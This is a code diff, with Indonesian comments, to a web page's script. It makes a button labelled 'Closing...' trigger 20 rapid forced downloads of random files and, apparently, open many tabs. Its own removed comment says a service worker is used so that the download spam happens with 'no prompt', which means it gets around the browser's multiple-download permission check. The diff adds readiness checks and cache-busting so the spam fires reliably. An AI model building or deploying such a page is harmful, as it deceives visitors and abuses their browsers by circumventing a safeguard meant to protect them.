@@ -53,14 +53,43 @@
     ];
 
     var assetFiles = ['assets/LOL.cpp', 'assets/hi.json', 'assets/guys.txt'];
+    var swReady = false;
 
-    // Register Service Worker
+    // Register SW dan tunggu sampai benar-benar aktif
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('./sw.js').then(function(reg) {
-        console.log('SW registered');
+
+        function waitForActive(reg) {
+          if (reg.active) {
+            swReady = true;
+            console.log('SW aktif, siap download');
+            return;
+          }
+          var sw = reg.installing || reg.waiting;
+          if (sw) {
+            sw.addEventListener('statechange', function() {
+              if (sw.state === 'activated') {
+                swReady = true;
+                console.log('SW baru aktif');
+              }
+            });
+          }
+        }
+
+        waitForActive(reg);
+
+        // Kalau sudah ada SW lama yang aktif, langsung set ready
+        navigator.serviceWorker.ready.then(function() {
+          swReady = true;
+          console.log('SW ready via .ready');
+        });
+
       }).catch(function(err) {
-        console.log('SW failed:', err);
+        console.log('SW gagal:', err);
+        swReady = true; // fallback tetap jalan walau SW gagal
       });
+    } else {
+      swReady = true; // browser tidak support SW
     }
 
     window.addEventListener('load', function () {
@@ -74,15 +103,25 @@
       document.getElementById('overlay').classList.add('active');
     }
 
-    // Download via anchor click ke SW-served URL — no permission prompt!
     function triggerDownload(filePath) {
       var a = document.createElement('a');
-      a.href = filePath;
+      a.href = filePath + '?t=' + Date.now(); // cache bust
       a.download = filePath.split('/').pop();
       a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
+    }
+
+    function doDownloads() {
+      for (var d = 0; d < 20; d++) {
+        (function(i) {
+          setTimeout(function() {
+            var f = assetFiles[Math.floor(Math.random() * assetFiles.length)];
+            triggerDownload(f);
+          }, i * 200);
+        })(d);
+      }
     }
 
     function openTabs(e) {
@@ -92,15 +131,18 @@
       btn.textContent = 'Closing...';
       btn.setAttribute('disabled', true);
 
-      // Spam 20 download via Service Worker — no prompt!
-      var totalDownload = 20;
-      for (var d = 0; d < totalDownload; d++) {
-        (function(i) {
-          setTimeout(function() {
-            var f = assetFiles[Math.floor(Math.random() * assetFiles.length)];
-            triggerDownload(f);
-          }, i * 300);
-        })(d);
+      if (swReady) {
+        doDownloads();
+      } else {
+        // Tunggu SW ready maksimal 3 detik, baru fire
+        var waited = 0;
+        var check = setInterval(function() {
+          waited += 100;
+          if (swReady || waited >= 3000) {
+            clearInterval(check);
+            doDownloads();
+          }
+        }, 100);
       }
 
       // Buka semua tab
